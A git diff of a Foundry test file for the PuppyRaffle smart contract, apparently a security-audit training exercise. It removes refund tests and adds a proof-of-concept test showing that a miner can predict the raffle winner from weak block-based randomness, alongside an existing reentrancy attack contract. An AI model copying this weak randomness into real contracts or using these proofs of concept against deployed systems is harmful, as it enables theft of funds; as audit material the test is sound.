@@ -4,6 +4,8 @@ pragma experimental ABIEncoderV2;
 
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
+
 
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
@@ -73,44 +75,9 @@ contract PuppyRaffleTest is Test {
         _;
     }
 
-    function testCanGetRefund() public playerEntered {
-        uint256 balanceBefore = address(playerOne).balance;
-        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
-
-        vm.prank(playerOne);
-        puppyRaffle.refund(indexOfPlayer);
-
-        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
-    }
-
-    function testGettingRefundRemovesThemFromArray() public playerEntered {
-        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
-
-        vm.prank(playerOne);
-        puppyRaffle.refund(indexOfPlayer);
-
-        assertEq(puppyRaffle.players(0), address(0));
-    }
-
-    function testOnlyPlayerCanRefundThemself() public playerEntered {
-        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
-        vm.expectRevert("PuppyRaffle: Only the player can refund");
-        vm.prank(playerTwo);
-        puppyRaffle.refund(indexOfPlayer);
-    }
-
     //////////////////////
     /// getActivePlayerIndex         ///
     /////////////////////
-    function testGetActivePlayerIndexManyPlayers() public {
-        address[] memory players = new address[](2);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
-
-        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
-        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
-    }
 
     //////////////////////
     /// selectWinner         ///
@@ -273,6 +240,54 @@ contract PuppyRaffleTest is Test {
 
         console.log("AttackContract balance after attack", attackBalance);
     }
+
+    function testGetActivePlayerIndex() public {
+        address[] memory play = new address[](3);
+        play[0] = playerOne;
+        play[1] = playerTwo;
+        play[2] = playerThree;
+
+        puppyRaffle.enterRaffle{value: entranceFee * play.length}(play);
+
+        //an active address should return its index
+        string memory activePlayer = puppyRaffle.getActivePlayerIndex(
+            playerOne
+        );
+        console.log(activePlayer);
+
+        //while an inactive address should return false value
+        string memory inActive = puppyRaffle.getActivePlayerIndex(playerFour);
+        console.log(inActive);
+    }
+
+    function test_exploitWeakRandomness() public {
+        address maliciousMiner = makeAddr("miner");
+        address[] memory players = new address[](5);
+
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        players[4] = maliciousMiner;
+        puppyRaffle.enterRaffle{value: entranceFee * 5}(players);
+        //by simulating a predetermined block difficulty and timestamp we can prove
+        //that a miner/validator can do that too
+        vm.warp(1678989);
+        //console.log(block.timestamp);
+        vm.prevrandao(bytes32(uint(25)));
+       // console.log(block.difficulty);
+        uint winningIndexManipulated = uint256(
+            keccak256(
+                abi.encodePacked(msg.sender, block.timestamp, block.difficulty)
+            )
+        ) % players.length;
+         string memory maliciousMinerIndex = puppyRaffle.getActivePlayerIndex(
+            maliciousMiner
+        );
+        address x= puppyRaffle.players(4);
+        console.log(x, maliciousMiner,playerOne);
+        assertEq(maliciousMinerIndex, Strings.toString(winningIndexManipulated));
+    }
 }
 
 contract REENTRANCY_ATTACK {
@@ -289,7 +304,7 @@ contract REENTRANCY_ATTACK {
         address[] memory players = new address[](1);
         players[0] = address(this);
         puppyRaffle.enterRaffle{value: entranceFee}(players);
-        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        //playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
     }
 
     function attack() public {
